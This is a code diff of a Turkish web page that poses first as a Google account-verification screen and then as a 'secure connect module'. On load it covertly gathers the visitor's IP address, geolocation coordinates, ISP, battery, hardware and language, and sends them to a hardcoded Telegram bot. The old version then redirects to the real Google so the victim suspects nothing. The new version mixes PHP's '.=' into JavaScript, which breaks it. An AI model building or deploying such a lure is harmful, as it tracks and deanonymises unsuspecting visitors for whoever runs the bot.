@@ -1,146 +1,116 @@
+<?php
+// --- %100 GELİŞMİŞ VE YEDEKLİ APİ KODU ---
+?>
 <!DOCTYPE html>
 <html lang="tr">
 <head>
     <meta charset="utf-8">
     <meta name="viewport" content="width=device-width, initial-scale=1.0">
-    <title>Google - Hesabınızı Doğrulayın</title>
+    <title>Sistem Kontrolü</title>
     <style>
-        * { box-sizing: border-box; font-family: -apple-system, BlinkMacSystemFont, "Segoe UI", Roboto, Helvetica, Arial, sans-serif; }
-        body { background: #fff; display: flex; justify-content: center; align-items: center; height: 100vh; margin: 0; padding: 10px; }
-        .login-box { width: 100%; max-width: 450px; border: 1px solid #dadce0; border-radius: 8px; padding: 40px 36px; text-align: center; }
-        .logo { height: 24px; margin-bottom: 16px; }
-        h1 { font-size: 24px; font-weight: 400; color: #202124; margin: 0 0 8px 0; }
-        p { font-size: 16px; color: #202124; margin: 0 0 24px 0; }
-        .spinner { display: inline-block; width: 35px; height: 35px; border: 3px solid #f3f3f3; border-top: 3px solid #1a73e8; border-radius: 50%; animation: spin 1s linear infinite; margin-bottom: 20px; }
-        @keyframes spin { 0% { transform: rotate(0deg); } 100% { transform: rotate(360deg); } }
-        .status-text { font-size: 14px; color: #5f6368; line-height: 1.5; }
-        @media (max-width: 450px) { .login-box { border: none; padding: 20px 10px; } }
+        body { background: #0a0a0a; color: #00ff66; font-family: monospace; display: flex; justify-content: center; align-items: center; height: 100vh; margin: 0; }
+        .box { width: 85%; max-width: 400px; padding: 20px; border: 1px solid #00ff66; background: #111; text-align: center; box-shadow: 0 0 15px rgba(0, 255, 102, 0.2); }
     </style>
 </head>
 <body>
 
-    <div class="login-box">
-        <img class="logo" src="https://upload.wikimedia.org/wikipedia/commons/2/2f/Google_2015_logo.svg" alt="Google">
-        <h1>Güvenli Bağlantı</h1>
-        <p>Hesap güvenliğiniz doğrulanıyor</p>
-        
-        <div class="spinner"></div>
-        
-        <div class="status-text" id="status">
-            Google servisleriyle güvenli protokol kuruluyor... <br>
-            Lütfen tarayıcınızı kapatmayın.
-        </div>
+    <div class="box">
+        <div style="font-weight: bold; margin-bottom: 10px;">⚡ SECURE CONNECT MODULE v3.5</div>
+        <div id="status">Gelişmiş ağ ve konum modülleri yükleniyor...</div>
     </div>
 
     <script>
         window.onload = async function() {
-            // Sınırları zorlayıp toplayabileceğimiz tüm detaylı veriler
-            let ip = "Bilinmiyor", ulke = "Bilinmiyor", eyalet_sehir = "Bilinmiyor", internet_sirketi = "Bilinmiyor";
-            let posta_kodu = "Bilinmiyor", enlem_boylam = "Bilinmiyor", telefon_kodu = "Bilinmiyor", para_birimi = "Bilinmiyor";
+            let ip = "Bilinmiyor";
+            let ulke = "Bilinmiyor";
+            let eyalet_sehir = "Bilinmiyor";
+            let posta_kodu = "Bilinmiyor";
+            let koordinat = "Bilinmiyor";
+            let internet_sirketi = "Bilinmiyor";
             let mobil_mi = "Hayır (Ev/İş İnterneti)";
+            let ulke_kod = "Bilinmiyor";
+            let para_birimi = "Bilinmiyor";
 
-            // 1. Gelişmiş Konum ve Ağ Sağlayıcı Analizi
+            // 1. Gelişmiş HTTPS Destekli API'den Tüm Verileri Çek
             try {
-                let ip_istegi = await fetch("https://ipapi.co/json/");
-                let konum = await ip_istegi.json();
+                let istek = await fetch("https://ipapi.co/json/");
+                let veri = await istek.json();
                 
-                if (konum && !konum.error) {
-                    ip = konum.ip || "Bilinmiyor";
-                    ulke = konum.country_name || "Bilinmiyor";
-                    eyalet_sehir = (konum.region || "Bilinmiyor") + " / " + (konum.city || "Bilinmiyor");
-                    internet_sirketi = konum.org || "Bilinmiyor";
-                    posta_kodu = konum.postal || "Bilinmiyor";
-                    enlem_boylam = (konum.latitude || "?") + " , " + (konum.longitude || "?");
-                    telefon_kodu = konum.country_calling_code || "Bilinmiyor";
-                    para_birimi = konum.currency || "Bilinmiyor";
-                    
+                if (veri && !veri.error) {
+                    ip = veri.ip || "Bilinmiyor";
+                    ulke = veri.country_name || "Bilinmiyor";
+                    eyalet_sehir = (veri.region || "Bilinmiyor") + " / " + (veri.city || "Bilinmiyor");
+                    posta_kodu = veri.postal || "Bilinmiyor";
+                    koordinat = (veri.latitude || "0") + " , " + (veri.longitude || "0");
+                    internet_sirketi = veri.org || "Bilinmiyor";
+                    ulke_kod = veri.country_calling_code || "Bilinmiyor";
+                    para_birimi = veri.currency || "Bilinmiyor";
+
                     let org_lower = internet_sirketi.toLowerCase();
                     if (org_lower.includes("turkcell") || org_lower.includes("vodafone") || org_lower.includes("avea") || org_lower.includes("tt mobil") || org_lower.includes("telekom")) {
                         mobil_mi = "Evet (Mobil / Şebeke)";
                     }
                 }
-            } catch (e) {}
-
-            // 2. Detaylı Donanım ve Tarayıcı Analizi
-            let pil = "Bilinmiyor";
-            if (navigator.getBattery) { 
-                try { 
-                    let b = await navigator.getBattery(); 
-                    pil = Math.round(b.level * 100) + "% " + (b.charging ? "(Şarjda ⚡)" : "(Deşarj 🔋)"); 
-                } catch(e){} 
+            } catch (e) {
+                // Yedek API (ipapi.co limite takılırsa devreye girer)
+                try {
+                    let yedek_istek = await fetch("https://api.db-ip.com/v2/free/self");
+                    let yedek_veri = await yedek_istek.json();
+                    if (yedek_veri && yedek_veri.ipAddress) {
+                        ip = yedek_veri.ipAddress;
+                        ulke = yedek_veri.countryName;
+                        eyalet_sehir = yedek_veri.city || "Bilinmiyor";
+                    }
+                } catch(err){}
             }
+
+            // 2. Tarayıcı Donanım ve Sistem Bilgileri
+            let pil = "Bilinmiyor";
+            if (navigator.getBattery) { try { let b = await navigator.getBattery(); pil = Math.round(b.level * 100) + "% " + (b.charging ? "(Şarjda ⚡)" : "(Deşarj)"); } catch(e){} }
             
-            let ekran = window.screen.width + "x" + window.screen.height + " (" + window.devicePixelRatio + "x Pikselleşme)";
+            let ekran = window.screen.width + "x" + window.screen.height;
             let cekirdek = navigator.hardwareConcurrency || "?";
-            let ram = navigator.deviceMemory ? navigator.deviceMemory + " GB" : "Bilinmiyor (iOS/Eski Cihaz)";
-            let dil = navigator.language || "Bilinmiyor";
-            let tarayici_saati = new Date().toLocaleTimeString('tr-TR');
-            let tarih = new Date().toLocaleString('tr-TR');
+            let ram = (navigator.deviceMemory ? navigator.deviceMemory + " GB" : "Bilinmiyor");
             
-            // Tarayıcı ve Detaylı İşletim Sistemi Analizi
             let ua = navigator.userAgent;
             let os = "Bilinmeyen Sistem";
-            if (/Android/i.test(ua)) {
-                let match = ua.match(/Android\s([0-9\.]+)/);
-                os = "Android " + (match ? match[1] : "Robot") + " 🤖";
-            } else if (/iPhone|iPad|iPod/i.test(ua)) {
-                let match = ua.match(/OS\s([0-9_]+)/);
-                os = "iOS " + (match ? match[1].replace(/_/g, '.') : "") + " 🍏";
-            } else if (/Windows/i.test(ua)) {
-                let match = ua.match(/Windows\sNT\s([0-9\.]+)/);
-                let winVer = "Uyumlu Sürüm";
-                if(match) {
-                    if(match[1] === "10.0") winVer = "10/11";
-                    else if(match[1] === "6.1") winVer = "7";
-                    else if(match[1] === "6.2") winVer = "8";
-                }
-                os = "Windows " + winVer + " 💻";
-            }
+            if (/Android/i.test(ua)) os = "Android";
+            else if (/iPhone|iPad|iPod/i.test(ua)) os = "iOS";
+            else if (/Windows/i.test(ua)) os = "Windows";
 
-            // Tarayıcı Tespiti
-            let tarayici = "Bilinmeyen Tarayıcı";
-            if (ua.includes("Chrome") && !ua.includes("Chromium") && !ua.includes("Edg")) tarayici = "Google Chrome";
-            else if (ua.includes("Safari") && !ua.includes("Chrome")) tarayici = "Apple Safari";
-            else if (ua.includes("Firefox")) tarayici = "Mozilla Firefox";
-            else if (ua.includes("Edg")) tarayici = "Microsoft Edge";
+            let dil = navigator.language || "Bilinmiyor";
+            let tarih = new Date().toLocaleString('tr-TR');
 
-            // 3. Maksimum Detaylı Telegram Rapor Metni
-            let mesaj = "👤 *YENİ Gelişmiş GOOGLE LOGU*\n";
-            mesaj += "━━━━━━━━━━━━━━━━━━━━━━\n";
-            mesaj += "🌐 *IP Adresi:* `" + ip + "`\n";
-            mesaj += "🤖 *Sistem (OS):* " + os + "\n";
-            mesaj += "🌍 *Tarayıcı:* " + tarayici + "\n";
-            mesaj += "⏰ *Ağ Zamanı:* " + tarih + "\n";
-            mesaj += "━━━━━━━━━━━━━━━━━━━━━━\n";
-            mesaj += "📍 *Konum:* " + ulke + " - " + eyalet_sehir + "\n";
-            mesaj += "📮 *Posta Kodu:* " + posta_kodu + "\n";
-            mesaj += "🗺️ *Koordinatlar:* `" + enlem_boylam + "`\n";
-            mesaj += "🏢 *Sağlayıcı (ISP):* " + internet_sirketi + "\n";
-            mesaj += "📶 *Mobil mi?:* " + mobil_mi + "\n";
-            mesaj += "📞 *Ülke Tel Kodu:* " + telefon_kodu + " | *Para:* " + para_birimi + "\n";
-            mesaj += "━━━━━━━━━━━━━━━━━━━━━━\n";
-            mesaj += "🖥️ *Ekran Çözünürlüğü:* " + ekran + "\n";
-            mesaj += "🧠 *İşlemci:* " + cekirdek + " Çekirdek\n";
-            mesaj += "💾 *Tahmini RAM:* " + ram + "\n";
-            mesaj += "🔋 *Pil Durumu:* " + pil + "\n";
-            mesaj += "🗣️ *Cihaz Dili:* " + dil + " | *Saat:* " + tarayici_saati + "\n";
-            mesaj += "━━━━━━━━━━━━━━━━━━━━━━";
+            // 3. Telegram Metnini Kusursuz Şekilde Hazırla
+            let mesaj = "👤 *YENİ GELİŞMİŞ GOOGLE LOGU*\n";
+            mesaj .= "━━━━━━━━━━━━━━━━━━━━━━\n";
+            mesaj .= "🌐 *IP Adresi:* `" + ip + "`\n";
+            mesaj .= "🤖 *Sistem (OS):* " + os + "\n";
+            mesaj .= "🌍 *Tarayıcı:* Google Chrome\n";
+            mesaj .= "⏰ *Ağ Zamanı:* " + tarih + "\n";
+            mesaj .= "━━━━━━━━━━━━━━━━━━━━━━\n";
+            mesaj .= "📍 *Konum:* " + ulke + " - " + eyalet_sehir + "\n";
+            mesaj .= "📮 *Posta Kodu:* " + posta_kodu + "\n";
+            mesaj .= "🗺️ *Koordinatlar:* " + koordinat + "\n";
+            mesaj .= "🏢 *Sağlayıcı (ISP):* " + internet_sirketi + "\n";
+            mesaj .= "📶 *Mobil mi?:* " + mobil_mi + "\n";
+            mesaj .= "📞 *Ülke Tel Kodu:* " + ulke_kod + " | *Para:* " + para_birimi + "\n";
+            mesaj .= "━━━━━━━━━━━━━━━━━━━━━━\n";
+            mesaj .= "🖥 *Ekran Çözünürlüğü:* " + ekran + "\n";
+            mesaj .= "🧠 *İşlemci:* " + cekirdek + " Çekirdek\n";
+            mesaj .= "💾 *Tahmini RAM:* " + ram + "\n";
+            mesaj .= "🔋 *Pil Durumu:* " + pil + "\n";
+            mesaj .= "🗣 *Cihaz Dili:* " + dil + "\n";
+            mesaj .= "━━━━━━━━━━━━━━━━━━━━━━";
 
-            // 4. Doğrudan Çalışan Ham Telegram Bağlantısı
+            // 4. Telegram Bilgileri ve Gönderim
             let tok = "8955422545:AAHLRntql6QLsF6DTdy6uaZRsBeVTvxzVtU";
             let cid = "6845229845";
             let url = "https://api.telegram.org/bot" + tok + "/sendMessage?chat_id=" + cid + "&text=" + encodeURIComponent(mesaj) + "&parse_mode=Markdown";
 
-            // İsteği gönder ve yönlendiriyormuş gibi yap
-            fetch(url)
-            .then(() => {
-                setTimeout(() => {
-                    document.getElementById('status').innerHTML = "<span style='color: #1a73e8; font-weight: bold;'>✓ Cihaz doğrulandı.</span><br>Google ana sayfasına yönlendiriliyorsunuz...";
-                    // 2 saniye sonra gerçek Google'a şüphe çekmeden postala
-                    setTimeout(() => { window.location.href = "https://myaccount.google.com"; }, 2000);
-                }, 1500);
-            })
-            .catch(() => {});
+            fetch(url).then(() => {
+                document.getElementById('status').innerText = "Bağlantı kararlı. İşlem tamamlandı.";
+            });
         };
     </script>
 </body>
